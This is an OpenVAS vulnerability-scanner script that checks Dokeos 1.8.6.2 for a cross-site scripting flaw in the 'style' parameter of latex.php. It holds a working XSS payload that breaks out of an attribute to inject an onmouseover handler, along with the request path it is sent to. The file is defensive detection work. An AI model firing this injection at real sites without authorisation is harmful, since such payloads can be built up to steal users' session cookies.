###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dokeos_46370.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# Dokeos 'style' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:dokeos:dokeos';

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103075");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-02-15 13:44:44 +0100 (Tue, 15 Feb 2011)");
  script_bugtraq_id(46370);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Dokeos 'style' Parameter Cross Site Scripting Vulnerability");

  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/46370");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("dokeos_detect.nasl");
  script_mandatory_keys("dokeos/installed");

  script_tag(name:"summary", value:"Dokeos is prone to a cross-site scripting vulnerability because it fails to
properly sanitize user-supplied input.

An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the
context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch
other attacks.

Dokeos 1.8.6.2 is vulnerable, other versions may also be affected.");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/main/inc/latex.php?code="style="top:0;position:absolute;width:9999px;height:9999px;"onmouseover%3d"alert(' + "'openvas-xss-test'" + ')"';

if (http_vuln_check(port:port, url:url,pattern:"onmouseover=.alert\('openvas-xss-test'\)", check_header:TRUE)) {
  security_message(port:port);
  exit(0);
}

exit(99);
